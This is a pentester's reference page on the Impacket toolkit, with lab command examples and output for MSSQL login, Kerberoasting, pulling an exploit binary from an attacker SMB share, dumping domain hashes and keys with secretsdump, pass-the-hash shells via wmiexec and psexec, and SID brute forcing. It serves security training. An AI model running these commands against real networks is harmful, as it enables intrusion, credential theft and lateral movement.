# Impacket

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/) 

## Info

Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols \(e.g. SMB1-3 and MSRPC\) the protocol implementation itself. 

Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library. 

The following protocols are featured in Impacket 

* Ethernet, Linux "Cooked" capture. 
* IP, TCP, UDP, ICMP, IGMP, ARP. 
* IPv4 and IPv6 Support. 
* NMB and SMB1, SMB2 and SMB3 \(high-level implementations\). 
* MSRPC version 5, over different transports: TCP, SMB/TCP, SMB/NetBIOS and HTTP. 
* Plain, NTLM and Kerberos authentications, using password/hashes/tickets/keys. 
* Portions/full implementation of the following MSRPC interfaces: EPM, DTYPES, LSAD, LSAT, NRPC, RRP, SAMR, SRVS, WKST, SCMR, DCOM, WMI 
* Portions of TDS \(MSSQL\) and LDAP protocol implementations. 

## Examples for scripts

### mssqlclient

An MSSQL client, supporting SQL and Windows Authentications \(hashes too\). It also supports TLS.

connect with mssqlclient.py. I’ll make sure to use the -windows-auth flag

```text

root@kali# mssqlclient.py reporting:'PASSWORD'@10.10.10.125 -windows-auth 
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation 
 

[*] Encryption required, switching to TLS 
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume 
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english 
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'. 
[*] INFO(QUERIER): Line 1: Changed language setting to us_english. 
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands 
SQL> 
```

### GetUsersSPNs

This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat. 

Get hashes: 

`GetUserSPNs.py -request -save -dc-ip <IP> domain/user` 

### SMBServer

A generic SMB client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination. It's an excellent example to see how to use impacket.smb in action. 

To get the server up and running on our local box, simple enter the following syntax: 

Starting the Server: 

/usr/bin/impacket-smbserver.py shareName sharePath {USE USERNAME and PASSWORD} 

* shareName - can be anything you want, but you’ll need to know this in order to connect back to the share 
* sharePath - the folder you want shared 

Using username and password smb smbv2: 

```text
smbserver.py -smb2support share . -username df -password df                                                                               
```



Example: 

```text
root@kali:~/pwk# impacket-smbserver smb tools/ 
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies 
[*] Config file parsed 
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed 
[*] Config file parsed 
[*] Config file parsed 
Connect to the server: 
C:\>net use 
\\10.11.0.XXX\smb
 
net use 
\\10.11.0.XXX\smb
 
The command completed successfully. 
```

#### Copy files: 

```text
C:\WINDOWS\Temp>copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe 
copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe 
        1 file(s) copied. 
```

### secretsdump

Performs various techniques to dump secrets from the remote machine without executing any agent there. For SAM and LSA Secrets \(including cached creds\) we try to read as much as we can from the registry and then we save the hives in the target system \(%SYSTEMROOT%\Temp directory\) and read the rest of the data from there. For DIT files, we dump NTLM hashes, Plaintext credentials \(if available\) and Kerberos keys using the DL\_DRSGetNCChanges\(\) method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available \(e.g. Remote Registry, even if it is disabled\). After the work is done, things are restored to the original state.

```text
root@kali# secretsdump.py -just-dc mrlky:Football#7@10.10.10.103 
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation             
 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) 
[*] Using the DRSUAPI method to get NTDS.DIT secrets 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267::: 
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8::: 
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3::: 
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef::: 
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de::: 
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:a571008b8559fc7e6abb364efa15312c::: 
[*] Kerberos keys grabbed                                                    
Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d 
Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3 
Administrator:des-cbc-md5:ad7afb706715e964                                    
krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e 
krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699 
krbtgt:des-cbc-md5:866db35eb9ec5173 
amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb 
amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061 
amanda:des-cbc-md5:70ba677a4c1a2adf 
mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155 
mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0 
mrlky:des-cbc-md5:02f1a4da0432f7f7 
sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d 
sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955 
sizzler:des-cbc-md5:5d51d30e68d092d9 
SIZZLE$:aes256-cts-hmac-sha1-96:037a6a1bb47867be060491ddc54ff4bdf8057e1713dc3e2dd9a88cd5305384f4 
SIZZLE$:aes128-cts-hmac-sha1-96:f7e839c51376067067d425a3baba2693 
SIZZLE$:des-cbc-md5:3210b6852a4a2ae9 
[*] Cleaning up...   
```

### wmiexec

A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy.

**Example:**

```text
root@kali:/opt/impacket# wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103 
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation 

[*] SMBv3.0 dialect used 
[!] Launching semi-interactive shell - Careful what you execute 
[!] Press help for extra shell commands 
C:\>whoami 
htb\administrator 
```

### psexec

PSEXEC like functionality example using RemComSvc\(https://github.com/kavika13/RemCom\). 

Example 

```text
root@kali:~/hackthebox/active-10.10.10.100# psexec.py active.htb/administrator@10.10.10.100 
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies 
Password: 
[*] Requesting shares on 10.10.10.100..... 
[*] Found writable share ADMIN$ 
[*] Uploading file dMCaaHzA.exe 
[*] Opening SVCManager on 10.10.10.100..... 
[*] Creating service aYMa on 10.10.10.100..... 
[*] Starting service aYMa..... 
[!] Press help for extra shell commands 
Microsoft Windows [Version 6.1.7601] 
Copyright (c) 2009 Microsoft Corporation.  All rights reserved. 
C:\Windows\system32>whoami 
nt authority\system 
```

### lookupsid

```text
PS C:\Users\Jack\Downloads\impacket-examples-windows-master> .\lookupsid.exe ETH/Jack:Password@192.168.211.128        
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies 

[*] Brute forcing SIDs at 192.168.211.128 
*] StringBinding ncacn_np:192.168.211.128[\pipe\lsarpc] 
[*] Domain SID is: S-1-5-21-XXXXX-2199257571-2188946577 
498: ETH\Enterprise Read-only Domain Controllers (SidTypeGroup) 
00: ETH\Administrator (SidTypeUser) 
501: ETH\Guest (SidTypeUser) 
502: ETH\krbtgt (SidTypeUser) 
512: ETH\Domain Admins (SidTypeGroup) 
513: ETH\Domain Users (SidTypeGroup) 
514: ETH\Domain Guests (SidTypeGroup) 
515: ETH\Domain Computers (SidTypeGroup) 
16: ETH\Domain Controllers (SidTypeGroup) 
517: ETH\Cert Publishers (SidTypeAlias) 
518: ETH\Schema Admins (SidTypeGroup) 
519: ETH\Enterprise Admins (SidTypeGroup) 
520: ETH\Group Policy Creator Owners (SidTypeGroup) 
521: ETH\Read-only Domain Controllers (SidTypeGroup) 
522: ETH\Cloneable Domain Controllers (SidTypeGroup) 
525: ETH\Protected Users (SidTypeGroup) 
526: ETH\Key Admins (SidTypeGroup) 
527: ETH\Enterprise Key Admins (SidTypeGroup) 
553: ETH\RAS and IAS Servers (SidTypeAlias) 
571: ETH\Allowed RODC Password Replication Group (SidTypeAlias) 
572: ETH\Denied RODC Password Replication Group (SidTypeAlias) 
1000: ETH\WIN-EU4DLP9KRRC$ (SidTypeUser) 
1101: ETH\DnsAdmins (SidTypeAlias) 
1102: ETH\DnsUpdateProxy (SidTypeGroup) 
1103: ETH\DESKTOP-OOBOA3U$ (SidTypeUser) 
1104: ETH\Jack (SidTypeUser) 
1105: ETH\Bob (SidTypeUser) 
1106: ETH\SVC_SQLServices (SidTypeUser) 
1107: ETH\Message Capture Users (SidTypeAlias) 
```

### GetNPUsers

 `AS-REP` roasting is an attack that is often-overlooked in my opinion it is not extremely common as you have to explicitly set `Accounts Does not Require Pre-Authentication` aka `DONT_REQ_PREAUTH`

```text
root@kali# GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
```

## Full list of tools that featured in Impacket 

### Remote Execution 

* [psexec.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/psexec.py) PSEXEC like functionality example using RemComSvc\([https://github.com/kavika13/RemCom](https://github.com/kavika13/RemCom)\). 
* [smbexec.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/smbexec.py) A similar approach to PSEXEC w/o using RemComSvc. The technique is described [here](https://web.archive.org/web/20140625065218/http:/blog.accuvant.com/rdavisaccuvant/owning-computers-without-shell-access/). Our implementation goes one step further, instantiating a local smbserver to receive the output of the commands. This is useful in the situation where the target machine does NOT have a writeable share available. 
* [atexec.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/atexec.py) This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. 
* [wmiexec.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/wmiexec.py) A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy. 
* [dcomexec.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/dcomexec.py) A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects. 

### Kerberos 

* [GetTGT.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/getTGT.py) Given a password, hash or aesKey, this script will request a TGT and save it as ccache. 
* [GetST.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/getST.py) Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation \(with protocol transition\) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user. 
* [GetPac.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/getPac.py) This script will get the PAC \(Privilege Attribute Certificate\) structure of the specified target user just having a normal authenticated user credentials. It does so by using a mix of \[MS-SFU\]'s S4USelf + User to User Kerberos Authentication. 
* [GetUserSPNs.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/GetUserSPNs.py) This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat. 
* [GetNPUsers.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/GetNPUsers.py) This example will attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set \(UF\_DONT\_REQUIRE\_PREAUTH\). Output is compatible with JtR. 
* [ticketer.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/ticketer.py) This script will create Golden/Silver tickets from scratch or based on a template \(legally requested from the KDC\) allowing you to customize some of the parameters set inside the PAC\_LOGON\_INFO structure, in particular the groups, ExtraSids, duration, etc. 
* [raiseChild.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/raiseChild.py) This script implements a child-domain to forest privilege escalation by \(ab\)using the concept of Golden Tickets and ExtraSids. 

### Windows Secrets 

* [secretsdump.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/secretsdump.py) Performs various techniques to dump secrets from the remote machine without executing any agent there. For SAM and LSA Secrets \(including cached creds\) we try to read as much as we can from the registry and then we save the hives in the target system \(%SYSTEMROOT%\Temp directory\) and read the rest of the data from there. For DIT files, we dump NTLM hashes, Plaintext credentials \(if available\) and Kerberos keys using the DL\_DRSGetNCChanges\(\) method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available \(e.g. Remote Registry, even if it is disabled\). After the work is done, things are restored to the original state. 
* [mimikatz.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/mimikatz.py) Mini shell to control a remote mimikatz RPC server developed by @gentilkiwi. 

### Server Tools/MiTM Attacks 

* [ntlmrelayx.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/ntlmrelayx.py) This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying credentials to many different protocols \(SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.\). The script can be used with predefined attacks that can be triggered when a connection is relayed \(e.g. create a user through LDAP\) or can be executed in SOCKS mode. In this mode, for every connection relayed, it will be available to be used later on multiple times through a SOCKS proxy. 
* [karmaSMB.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/karmaSMB.py) A SMB Server that answers specific file contents regardless of the SMB share and pathname specified. 
* [smbserver.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/smbserver.py) A Python implementation of an SMB server. Allows to quickly set up shares and user accounts. 

### WMI 

* [wmiquery.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/wmiquery.py) It allows to issue WQL queries and get description of WMI objects at the target system \(e.g. select name from win32\_account\). 
* [wmipersist.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/wmipersist.py) This script creates/removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified. 

### Known Vulnerabilities 

* [goldenPac.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/goldenPac.py) Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target. 
* [sambaPipe.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/sambaPipe.py) This script will exploit CVE-2017-7494, uploading and executing the shared library specified by the user through the -so parameter. 
* [smbrelayx.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/smbrelayx.py) Exploit for CVE-2015-0005 using a SMB Relay Attack. If the target system is enforcing signing and a machine account was provided, the module will try to gather the SMB session key through NETLOGON. 

### SMB/MSRPC 

* [smbclient.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/smbclient.py) A generic SMB client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination. It's an excellent example to see how to use impacket.smb in action. 
* [getArch.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/getArch.py) This script will connect against a target \(or list of targets\) machine/s and gather the OS architecture type installed by \(ab\)using a documented MSRPC feature. 
* [rpcdump.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/rpcdump.py) This script will dump the list of RPC endpoints and string bindings registered at the target. It will also try to match them with a list of well known endpoints. 
* [ifmap.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/ifmap.py) This script will bind to the target's MGMT interface to get a list of interface IDs. It will used that list on top of another list of interface UUIDs seen in the wild trying to bind to each interface and reports whether the interface is listed and/or listening. 
* [opdump.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/opdump.py) This binds to the given hostname:port and MSRPC interface. Then, it tries to call each of the first 256 operation numbers in turn and reports the outcome of each call. 
* [samrdump.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/samrdump.py) An application that communicates with the Security Account Manager Remote interface from the MSRPC suite. It lists system user accounts, available resource shares and other sensitive information exported through this service. 
* [services.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/services.py) This script can be used to manipulate Windows services through the \[MS-SCMR\] MSRPC Interface. It supports start, stop, delete, status, config, list, create and change. 
* [netview.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/netview.py) Gets a list of the sessions opened at the remote hosts and keep track of them looping over the hosts found and keeping track of who logged in/out from remote servers 
* [reg.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/reg.py) Remote registry manipulation tool through the \[MS-RRP\] MSRPC Interface. The idea is to provide similar functionality as the REG.EXE Windows utility. 
* [lookupsid.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/lookupsid.py) A Windows SID brute forcer example through \[MS-LSAT\] MSRPC Interface, aiming at finding remote users/groups. 

### MSSQL / TDS 

* [mssqlinstance.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/mssqlinstance.py) Retrieves the MSSQL instances names from the target host. 
* [mssqlclient.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/mssqlclient.py) An MSSQL client, supporting SQL and Windows Authentications \(hashes too\). It also supports TLS. 

### File Formats 

* [esentutl.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/esentutl.py) An Extensibe Storage Engine format implementation. Allows dumping catalog, pages and tables of ESE databases \(e.g. NTDS.dit\) 
* [ntfs-read.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/ntfs-read.py) NTFS format implementation. This script provides a mini shell for browsing and extracting an NTFS volume, including hidden/locked contents. 
* [registry-read.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/registry-read.py) A Windwows Registry file format implementation. It allows to parse offline registry hives. 

### Other 

* [GetADUsers.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/GetADUsers.py) This script will gather data about the domain's users and their corresponding email addresses. It will also include some extra information about last logon and last password set attributes. 
* [mqtt\_check.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/mqtt_check.py) Simple MQTT example aimed at playing with different login options. Can be converted into a account/password brute forcer quite easily. 
* [rdp\_check.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/rdp_check.py) \[MS-RDPBCGR\] and \[MS-CREDSSP\] partial implementation just to reach CredSSP auth. This example test whether an account is valid on the target host. 
* [sniff.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/sniff.py) Simple packet sniffer that uses the pcapy library to listen for packets in \# transit over the specified interface. 
* [sniffer.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/sniffer.py) Simple packet sniffer that uses a raw socket to listen for packets in transit corresponding to the specified protocols. 
* [ping.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/ping.py) Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. If the remote host is up, it should reply to the echo probe with an echo-reply packet. 
* [ping6.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/ping6.py) Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. 

## 

